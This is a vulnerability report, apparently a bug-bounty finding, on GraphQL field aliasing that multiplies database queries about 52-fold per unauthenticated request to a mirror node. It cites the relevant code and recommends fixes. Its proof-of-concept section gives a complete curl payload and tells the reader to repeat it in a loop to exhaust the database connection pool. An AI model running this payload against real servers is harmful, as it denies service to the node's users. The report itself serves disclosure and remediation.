### Title
GraphQL Field Aliasing Allows ~52x DB Query Amplification per Unauthenticated Request

### Summary
The GraphQL endpoint at `/graphql/alpha` accepts unauthenticated requests. The `MaxQueryComplexityInstrumentation` is configured with a limit of 200 using the default per-field complexity of 1, which does not reflect the actual database cost of each root-level `account` resolver invocation. An attacker can pack approximately 52 aliased `account` queries into a single HTTP request (bounded by the `maxTokens(1000)` parser limit), each triggering a separate database query, achieving ~52x DB load amplification per HTTP request with no authentication required.

### Finding Description

**Exact code path:**

`graphql/src/main/resources/graphql/query.graphqls` line 5 — the sole query root:
```graphql
type Query {
    account(input: AccountInput!): Account
}
```

`graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java` lines 43–45 — the instrumentation configuration:
```java
var maxQueryComplexity = new MaxQueryComplexityInstrumentation(200);
var maxQueryDepth = new MaxQueryDepthInstrumentation(10);
var instrumentation = new ChainedInstrumentation(maxQueryComplexity, maxQueryDepth);
```

`graphql/src/main/java/org/hiero/mirror/graphql/controller/AccountController.java` lines 33–58 — each `account` invocation independently calls the entity service, which issues a DB query:
```java
@QueryMapping
Optional<Account> account(@Argument @Valid AccountInput input) {
    ...
    return entityService.getByIdAndType(toEntityId(entityId), EntityType.ACCOUNT)...
    // or getByAliasAndType / getByEvmAddressAndType
}
```

**Root cause:** `MaxQueryComplexityInstrumentation(200)` uses the default `FieldComplexityCalculator` which assigns a complexity of **1 per field**. In graphql-java, each aliased root field is counted as a separate field with complexity 1. A minimal aliased query `a1: account(input: {entityId: {num: 1}}) { id }` has complexity 2 (1 for `account` + 1 for `id`), allowing up to 100 aliases before hitting the complexity ceiling. The binding constraint is actually the `maxTokens(1000)` parser limit: each minimal alias consumes ~19 GraphQL tokens, so `(1000 - 2) / 19 ≈ 52` aliases fit per request.

**Failed assumption:** The complexity limit of 200 was intended to prevent resource abuse, but the default complexity calculator treats all fields equally at cost 1, completely ignoring that each root-level `account` alias triggers an independent synchronous database query via `EntityRepository`.

**No rate limiting exists in the graphql module.** The `ThrottleConfiguration` and `ThrottleManagerImpl` (bucket4j-based) exist only in the `web3` module. The `graphql` module has no equivalent.

### Impact Explanation

Each aliased `account` field in a single HTTP request causes `AccountController.account()` to be invoked independently, issuing a separate SQL query against the `entity` table (via `findById`, `findByAlias`, or `findByEvmAddress`). With ~52 aliases per request, a single unauthenticated HTTP POST generates ~52 database queries. An attacker sending requests in a tight loop can exhaust the HikariCP connection pool (monitored at 75% utilization threshold in `values.yaml` line 209), degrade query latency for all users, and prevent the mirror node from gossiping or processing transactions that depend on timely DB access.

### Likelihood Explanation

No authentication or API key is required. The exploit requires only a standard HTTP client and knowledge of any valid (or even invalid) account identifier — the DB query fires regardless of whether the account exists. The attack is trivially scriptable, repeatable at high frequency, and requires no special privileges or insider knowledge. The GraphQL endpoint is publicly documented and exposed.

### Recommendation

1. **Use a custom `FieldComplexityCalculator`** that assigns a high base cost (e.g., 100) to root-level resolver fields (`account`), so that even a single alias pair `a1: account, a2: account` immediately approaches or exceeds the complexity limit.
2. **Add HTTP-level rate limiting** to the `graphql` module analogous to the bucket4j throttle in the `web3` module (`ThrottleConfiguration`), limiting requests per IP per second.
3. **Reduce the complexity ceiling** from 200 to a value that reflects the actual schema (currently only one root field exists), e.g., set it to 20–30 to allow reasonable field selection on a single `account` query while blocking multi-alias abuse.

### Proof of Concept

```bash
# Send a single HTTP request with 52 aliased account queries,
# each triggering a separate DB query. No authentication needed.
curl -s -X POST http://<host>/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "{
      a1:account(input:{entityId:{num:1}}){id}
      a2:account(input:{entityId:{num:2}}){id}
      a3:account(input:{entityId:{num:3}}){id}
      a4:account(input:{entityId:{num:4}}){id}
      a5:account(input:{entityId:{num:5}}){id}
      a6:account(input:{entityId:{num:6}}){id}
      a7:account(input:{entityId:{num:7}}){id}
      a8:account(input:{entityId:{num:8}}){id}
      a9:account(input:{entityId:{num:9}}){id}
      a10:account(input:{entityId:{num:10}}){id}
      a11:account(input:{entityId:{num:11}}){id}
      a12:account(input:{entityId:{num:12}}){id}
      a13:account(input:{entityId:{num:13}}){id}
      a14:account(input:{entityId:{num:14}}){id}
      a15:account(input:{entityId:{num:15}}){id}
      a16:account(input:{entityId:{num:16}}){id}
      a17:account(input:{entityId:{num:17}}){id}
      a18:account(input:{entityId:{num:18}}){id}
      a19:account(input:{entityId:{num:19}}){id}
      a20:account(input:{entityId:{num:20}}){id}
      a21:account(input:{entityId:{num:21}}){id}
      a22:account(input:{entityId:{num:22}}){id}
      a23:account(input:{entityId:{num:23}}){id}
      a24:account(input:{entityId:{num:24}}){id}
      a25:account(input:{entityId:{num:25}}){id}
      a26:account(input:{entityId:{num:26}}){id}
      a27:account(input:{entityId:{num:27}}){id}
      a28:account(input:{entityId:{num:28}}){id}
      a29:account(input:{entityId:{num:29}}){id}
      a30:account(input:{entityId:{num:30}}){id}
      a31:account(input:{entityId:{num:31}}){id}
      a32:account(input:{entityId:{num:32}}){id}
      a33:account(input:{entityId:{num:33}}){id}
      a34:account(input:{entityId:{num:34}}){id}
      a35:account(input:{entityId:{num:35}}){id}
      a36:account(input:{entityId:{num:36}}){id}
      a37:account(input:{entityId:{num:37}}){id}
      a38:account(input:{entityId:{num:38}}){id}
      a39:account(input:{entityId:{num:39}}){id}
      a40:account(input:{entityId:{num:40}}){id}
      a41:account(input:{entityId:{num:41}}){id}
      a42:account(input:{entityId:{num:42}}){id}
      a43:account(input:{entityId:{num:43}}){id}
      a44:account(input:{entityId:{num:44}}){id}
      a45:account(input:{entityId:{num:45}}){id}
      a46:account(input:{entityId:{num:46}}){id}
      a47:account(input:{entityId:{num:47}}){id}
      a48:account(input:{entityId:{num:48}}){id}
      a49:account(input:{entityId:{num:49}}){id}
      a50:account(input:{entityId:{num:50}}){id}
      a51:account(input:{entityId:{num:51}}){id}
      a52:account(input:{entityId:{num:52}}){id}
    }"
  }'
# Expected: HTTP 200 with 52 data fields, each backed by a separate DB query.
# Complexity = 52*2 = 104 < 200 limit. Token count ≈ 52*19+2 = 990 < 1000 limit.
# Repeat in a loop to exhaust DB connection pool.
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** graphql/src/main/resources/graphql/query.graphqls (L4-6)
```text
type Query {
    account(input: AccountInput!): Account
}
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java (L33-38)
```java
        Consumer<Builder> consumer =
                b -> b.maxCharacters(10000).maxRuleDepth(100).maxTokens(1000).maxWhitespaceTokens(1000);
        ParserOptions.setDefaultParserOptions(
                ParserOptions.getDefaultParserOptions().transform(consumer));
        ParserOptions.setDefaultOperationParserOptions(
                ParserOptions.getDefaultOperationParserOptions().transform(consumer));
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java (L43-45)
```java
        var maxQueryComplexity = new MaxQueryComplexityInstrumentation(200);
        var maxQueryDepth = new MaxQueryDepthInstrumentation(10);
        var instrumentation = new ChainedInstrumentation(maxQueryComplexity, maxQueryDepth);
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/controller/AccountController.java (L33-58)
```java
    Optional<Account> account(@Argument @Valid AccountInput input) {
        final var alias = input.getAlias();
        final var evmAddress = input.getEvmAddress();
        final var entityId = input.getEntityId();
        final var id = input.getId();

        validateOneOf(alias, entityId, evmAddress, id);

        if (entityId != null) {
            return entityService
                    .getByIdAndType(toEntityId(entityId), EntityType.ACCOUNT)
                    .map(accountMapper::map);
        }

        if (alias != null) {
            return entityService.getByAliasAndType(alias, EntityType.ACCOUNT).map(accountMapper::map);
        }

        if (evmAddress != null) {
            return entityService
                    .getByEvmAddressAndType(evmAddress, EntityType.ACCOUNT)
                    .map(accountMapper::map);
        }

        throw new IllegalStateException("Not implemented");
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java (L12-18)
```java
public interface EntityRepository extends CrudRepository<Entity, Long> {
    @Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
    Optional<Entity> findByAlias(byte[] alias);

    @Query(value = "select * from entity where evm_address = ?1 and deleted is not true", nativeQuery = true)
    Optional<Entity> findByEvmAddress(byte[] evmAddress);
}
```
